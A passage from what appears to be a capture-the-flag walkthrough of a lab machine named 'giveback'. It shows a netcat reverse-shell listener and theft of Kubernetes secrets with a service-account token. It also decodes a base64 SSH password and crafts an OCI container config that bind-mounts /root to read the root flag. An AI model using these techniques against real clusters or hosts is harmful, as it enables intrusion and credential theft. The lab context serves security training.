class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9002</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.129.183.181] 22553</span><br><span class="line">cd /run</span><br><span class="line">curl https://kubernetes.default.svc/api/v1/namespaces/default/secrets</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line">curl -k -H &quot;Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)&quot; https://kubernetes.default.svc/api/v1/namespaces/default/secrets</span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;SecretList&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;resourceVersion&quot;: &quot;2870018&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;items&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;beta-vino-wp-mariadb&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;3473d5ec-b774-40c9-a249-81d51426a45e&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;2088227&quot;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2024-09-21T22:17:31Z&quot;,</span><br><span class="line">        &quot;labels&quot;: &#123;</span><br><span class="line">          &quot;app.kubernetes.io/instance&quot;: &quot;beta-vino-wp&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/managed-by&quot;: &quot;Helm&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/name&quot;: &quot;mariadb&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/part-of&quot;: &quot;mariadb&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/version&quot;: &quot;11.8.2&quot;,</span><br><span class="line">          &quot;helm.sh/chart&quot;: &quot;mariadb-21.0.0&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;meta.helm.sh/release-name&quot;: &quot;beta-vino-wp&quot;,</span><br><span class="line">          &quot;meta.helm.sh/release-namespace&quot;: &quot;default&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;managedFields&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;manager&quot;: &quot;helm&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;Update&quot;,</span><br><span class="line">            &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">            &quot;time&quot;: &quot;2025-08-29T03:29:54Z&quot;,</span><br><span class="line">            &quot;fieldsType&quot;: &quot;FieldsV1&quot;,</span><br><span class="line">            &quot;fieldsV1&quot;: &#123;</span><br><span class="line">              &quot;f:data&quot;: &#123;</span><br><span class="line">                &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                &quot;f:mariadb-password&quot;: &#123;&#125;,</span><br><span class="line">                &quot;f:mariadb-root-password&quot;: &#123;&#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:metadata&quot;: &#123;</span><br><span class="line">                &quot;f:annotations&quot;: &#123;</span><br><span class="line">                  &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:meta.helm.sh/release-name&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:meta.helm.sh/release-namespace&quot;: &#123;&#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;f:labels&quot;: &#123;</span><br><span class="line">                  &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/instance&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/managed-by&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/name&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/part-of&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/version&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:helm.sh/chart&quot;: &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:type&quot;: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;data&quot;: &#123;</span><br><span class="line">        &quot;mariadb-password&quot;: &quot;c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T&quot;,</span><br><span class="line">        &quot;mariadb-root-password&quot;: &quot;c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;type&quot;: &quot;Opaque&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;beta-vino-wp-wordpress&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;1cbbc5ac-1611-46af-8033-09e98dfc546b&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;2088228&quot;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2024-09-21T22:17:31Z&quot;,</span><br><span class="line">        &quot;labels&quot;: &#123;</span><br><span class="line">          &quot;app.kubernetes.io/instance&quot;: &quot;beta-vino-wp&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/managed-by&quot;: &quot;Helm&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/name&quot;: &quot;wordpress&quot;,</span><br><span class="line">          &quot;app.kubernetes.io/version&quot;: &quot;6.8.2&quot;,</span><br><span class="line">          &quot;helm.sh/chart&quot;: &quot;wordpress-25.0.5&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;meta.helm.sh/release-name&quot;: &quot;beta-vino-wp&quot;,</span><br><span class="line">          &quot;meta.helm.sh/release-namespace&quot;: &quot;default&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;managedFields&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;manager&quot;: &quot;helm&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;Update&quot;,</span><br><span class="line">            &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">            &quot;time&quot;: &quot;2025-08-29T03:29:54Z&quot;,</span><br><span class="line">            &quot;fieldsType&quot;: &quot;FieldsV1&quot;,</span><br><span class="line">            &quot;fieldsV1&quot;: &#123;</span><br><span class="line">              &quot;f:data&quot;: &#123;</span><br><span class="line">                &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                &quot;f:wordpress-password&quot;: &#123;&#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:metadata&quot;: &#123;</span><br><span class="line">                &quot;f:annotations&quot;: &#123;</span><br><span class="line">                  &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:meta.helm.sh/release-name&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:meta.helm.sh/release-namespace&quot;: &#123;&#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;f:labels&quot;: &#123;</span><br><span class="line">                  &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/instance&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/managed-by&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/name&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:app.kubernetes.io/version&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:helm.sh/chart&quot;: &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:type&quot;: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;data&quot;: &#123;</span><br><span class="line">        &quot;wordpress-password&quot;: &quot;TzhGN0tSNXpHaQ==&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;type&quot;: &quot;Opaque&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;sh.helm.release.v1.beta-vino-wp.v58&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;13034cd4-64e1-4e2e-9182-4ce0ffda27e8&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;2123405&quot;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2025-08-30T05:17:49Z&quot;,</span><br><span class="line">        &quot;labels&quot;: &#123;</span><br><span class="line">          &quot;modifiedAt&quot;: &quot;1726957051&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;beta-vino-wp&quot;,</span><br><span class="line">          &quot;owner&quot;: &quot;helm&quot;,</span><br><span class="line">          &quot;status&quot;: &quot;superseded&quot;,</span><br><span class="line">          &quot;version&quot;: &quot;58&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;managedFields&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;manager&quot;: &quot;Helm&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;Update&quot;,</span><br><span class="line">            &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">            &quot;time&quot;: &quot;2025-08-30T05:21:45Z&quot;,</span><br><span class="line">            &quot;fieldsType&quot;: &quot;FieldsV1&quot;,</span><br><span class="line">            &quot;fieldsV1&quot;: &#123;</span><br><span class="line">              &quot;f:data&quot;: &#123;</span><br><span class="line">                &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                &quot;f:release&quot;: &#123;&#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:metadata&quot;: &#123;</span><br><span class="line">                &quot;f:labels&quot;: &#123;</span><br><span class="line">                  &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:modifiedAt&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:name&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:owner&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:status&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;f:version&quot;: &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:type&quot;: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;data&quot;: &#123;</span><br><span class="line">        &quot;release&quot;: &quot;&lt;VERY LONG SNIP&gt;&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;type&quot;: &quot;helm.sh/release.v1&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;user-secret-babywyrm&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;75bec579-fa8c-495b-ad03-76652c818dfa&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;2856320&quot;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2025-11-04T20:55:37Z&quot;,</span><br><span class="line">        &quot;ownerReferences&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;apiVersion&quot;: &quot;bitnami.com/v1alpha1&quot;,</span><br><span class="line">            &quot;kind&quot;: &quot;SealedSecret&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;user-secret-babywyrm&quot;,</span><br><span class="line">            &quot;uid&quot;: &quot;7c167e3a-705b-42d0-92c8-b0c73e1f5c86&quot;,</span><br><span class="line">            &quot;controller&quot;: true</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;managedFields&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;manager&quot;: &quot;controller&quot;,</span><br><span class="line">            &quot;operation&quot;: &quot;Update&quot;,</span><br><span class="line">            &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">            &quot;time&quot;: &quot;2025-11-04T20:55:37Z&quot;,</span><br><span class="line">            &quot;fieldsType&quot;: &quot;FieldsV1&quot;,</span><br><span class="line">            &quot;fieldsV1&quot;: &#123;</span><br><span class="line">              &quot;f:data&quot;: &#123;</span><br><span class="line">                &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                &quot;f:MASTERPASS&quot;: &#123;&#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:metadata&quot;: &#123;</span><br><span class="line">                &quot;f:ownerReferences&quot;: &#123;</span><br><span class="line">                  &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;k:&#123;\&quot;uid\&quot;:\&quot;7c167e3a-705b-42d0-92c8-b0c73e1f5c86\&quot;&#125;&quot;: &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;,</span><br><span class="line">              &quot;f:type&quot;: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;data&quot;: &#123;</span><br><span class="line">        &quot;MASTERPASS&quot;: &quot;N2xnandUYlVESG1wTWxTd1VZWU1RV24xNk1pWnJSNA==&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;type&quot;: &quot;Opaque&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The secret <code>user-secret-babywyrm</code> contains a <code>MASTERPASS</code>. Decoding it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo N2xnandUYlVESG1wTWxTd1VZWU1RV24xNk1pWnJSNA== | base64 -d</span><br><span class="line">7lgjwTbUDHmpMlSwUYYMQWn16MiZrR4</span><br></pre></td></tr></table></figure></div>
+
+<p>The secret name gives us the username <code>babywyrm</code>, and the MASTERPASS is the SSH password.</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ ssh babywrm@10.129.183.181</span><br><span class="line">The authenticity of host &#x27;10.129.183.181 (10.129.183.181)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:QW0UEukNwOzzXzOIYR311JYiuhYUEv8FYbRgwiKZ35g.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.129.183.181&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">babywrm@10.129.183.181&#x27;s password:</span><br><span class="line">Permission denied, please try again.</span><br><span class="line">babywrm@10.129.183.181&#x27;s password:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/CVE-2024-5932]</span><br><span class="line">└─$ ssh babywyrm@10.129.183.181</span><br><span class="line">babywyrm@10.129.183.181&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Wed Nov 5 04:39:18 2025 from 10.10.16.7</span><br><span class="line">babywyrm@giveback:~$ cat user.txt</span><br><span class="line">2aa07a85afd8b6da5f2323e32057de4b</span><br><span class="line">babywyrm@giveback:~$</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Checking sudo privileges:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">babywyrm@giveback:~$ sudo -l</span><br><span class="line">Matching Defaults entries for babywyrm on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line">    timestamp_timeout=0, timestamp_timeout=20</span><br><span class="line"></span><br><span class="line">User babywyrm may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: !ALL</span><br><span class="line">    (ALL) /opt/debug</span><br></pre></td></tr></table></figure></div>
+
+<p><code>(ALL) NOPASSWD: !ALL</code> with <code>(ALL) /opt/debug</code> — we can run <code>/opt/debug</code> as root but it requires a password. Investigating the system, we find the <code>seal-sync.service</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">babywyrm@giveback:~$ cat /etc/systemd/system/seal-sync.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=SRE Sync admin master password from Kubernetes (SEAL)</span><br><span class="line">After=network-online.target k3s.service</span><br><span class="line">Wants=network-online.target k3s.service</span><br><span class="line"></span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line"></span><br><span class="line"># Wait for the Kubernetes API to respond</span><br><span class="line">ExecStartPre=/bin/bash -c &quot;for i in &#123;1..30&#125;; do \</span><br><span class="line">  kubectl get nodes &amp;&gt;/dev/null &amp;&amp; exit 0 || &#123; \</span><br><span class="line">    echo &#x27;waiting for k3s API (&#x27;$i&#x27;/30)...&#x27;; \</span><br><span class="line">    sleep 5; \</span><br><span class="line">  &#125;; \</span><br><span class="line">done; \</span><br><span class="line">echo &#x27;k3s API never came up&#x27; &gt;&amp;2; \</span><br><span class="line">exit 1&quot;</span><br><span class="line"></span><br><span class="line"># Wait for the sealed-secrets controller pod to be ready</span><br><span class="line">ExecStartPre=/bin/bash -c &quot;for i in &#123;1..30&#125;; do \</span><br><span class="line">  kubectl -n kube-system get pods -l name=sealed-secrets-controller 2&gt;/dev/null | grep -q &#x27;1/1&#x27; &amp;&amp; exit 0 || &#123; \</span><br><span class="line">    echo &#x27;waiting for sealed-secrets controller pod (&#x27;$i&#x27;/30)...&#x27;; \</span><br><span class="line">    sleep 5; \</span><br><span class="line">  &#125;; \</span><br><span class="line">done; \</span><br><span class="line">echo &#x27;sealed-secrets controller pod not ready&#x27; &gt;&amp;2; \</span><br><span class="line">exit 1&quot;</span><br><span class="line"></span><br><span class="line"># Main script</span><br><span class="line">ExecStart=/root/python/SEAL/boot.sh</span><br><span class="line">Environment=&quot;KUBECONFIG=/etc/rancher/k3s/k3s.yaml&quot;</span><br><span class="line">WorkingDirectory=/root/python/SEAL</span><br><span class="line">User=root</span><br><span class="line">TimeoutStartSec=600</span><br><span class="line"></span><br><span class="line"># Capture output to both the journal and /var/log/boot_script.log</span><br><span class="line">StandardOutput=append:/var/log/boot_script.log</span><br><span class="line">StandardError=append:/var/log/boot_script.log</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>
+
+<p>The boot log at <code>/var/log/boot_script.log</code> confirms this service syncs sealed secrets from Kubernetes and sets the <code>babywyrm</code> system password. It also reveals <code>boot.sh</code> sets an administrative password. The MariaDB root password <code>c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T</code> from the K8s secrets dump doubles as the administrative password for <code>/opt/debug</code>.</p>
+<p><code>/opt/debug</code> is an OCI container runtime (runc-like). We craft a minimal OCI container spec that bind-mounts <code>/root</code> from the host and reads the flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">babywyrm@giveback:~$ mkdir -p ~/pwn</span><br><span class="line">babywyrm@giveback:~$ cd pwn/</span><br><span class="line">babywyrm@giveback:~/pwn$ mkdir rootfs</span><br><span class="line">babywyrm@giveback:~/pwn$ cat &gt; config.json &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;ociVersion&quot;: &quot;1.0.2&quot;,</span><br><span class="line">  &quot;process&quot;: &#123;</span><br><span class="line">    &quot;user&quot;: &#123;&quot;uid&quot;: 0, &quot;gid&quot;: 0&#125;,</span><br><span class="line">    &quot;args&quot;: [&quot;/bin/cat&quot;, &quot;/root/root.txt&quot;],</span><br><span class="line">    &quot;cwd&quot;: &quot;/&quot;,</span><br><span class="line">    &quot;env&quot;: [&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;],</span><br><span class="line">    &quot;terminal&quot;: false</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;root&quot;: &#123;&quot;path&quot;: &quot;rootfs&quot;&#125;,</span><br><span class="line">  &quot;mounts&quot;: [</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/proc&quot;, &quot;type&quot;: &quot;proc&quot;, &quot;source&quot;: &quot;proc&quot;&#125;,</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/dev&quot;, &quot;type&quot;: &quot;tmpfs&quot;, &quot;source&quot;: &quot;tmpfs&quot;, &quot;options&quot;: [&quot;nosuid&quot;,&quot;strictatime&quot;,&quot;mode=755&quot;,&quot;size=65536k&quot;]&#125;,</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/bin&quot;, &quot;type&quot;: &quot;bind&quot;, &quot;source&quot;: &quot;/bin&quot;, &quot;options&quot;: [&quot;bind&quot;,&quot;ro&quot;]&#125;,</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/lib&quot;, &quot;type&quot;: &quot;bind&quot;, &quot;source&quot;: &quot;/lib&quot;, &quot;options&quot;: [&quot;bind&quot;,&quot;ro&quot;]&#125;,</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/lib64&quot;, &quot;type&quot;: &quot;bind&quot;, &quot;source&quot;: &quot;/lib64&quot;, &quot;options&quot;: [&quot;bind&quot;,&quot;ro&quot;]&#125;,</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/root&quot;, &quot;type&quot;: &quot;bind&quot;, &quot;source&quot;: &quot;/root&quot;, &quot;options&quot;: [&quot;bind&quot;,&quot;ro&quot;]&#125;,</span><br><span class="line">    &#123;&quot;destination&quot;: &quot;/usr&quot;, &quot;type&quot;: &quot;bind&quot;, &quot;source&quot;: &quot;/usr&quot;, &quot;options&quot;: [&quot;bind&quot;,&quot;ro&quot;]&#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;linux&quot;: &#123;</span><br><span class="line">    &quot;namespaces&quot;: [</span><br><span class="line">      &#123;&quot;type&quot;: &quot;pid&quot;&#125;,</span><br><span class="line">      &#123;&quot;type&quot;: &quot;network&quot;&#125;,</span><br><span class="line">      &#123;&quot;type&quot;: &quot;ipc&quot;&#125;,</span><br><span class="line">      &#123;&quot;type&quot;: &quot;uts&quot;&#125;,</span><br><span class="line">      &#123;&quot;type&quot;: &quot;mount&quot;&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">babywyrm@giveback:~/pwn$ sudo /opt/debug run pwn</span><br><span class="line">Validating sudo...</span><br><span class="line">Please enter the administrative password:</span><br><span class="line"></span><br><span class="line">Both passwords verified. Executing the command...</span><br><span class="line">84ed26973cc635eb25918fdd5d477419</span><br></pre></td></tr></table></figure></div>
+
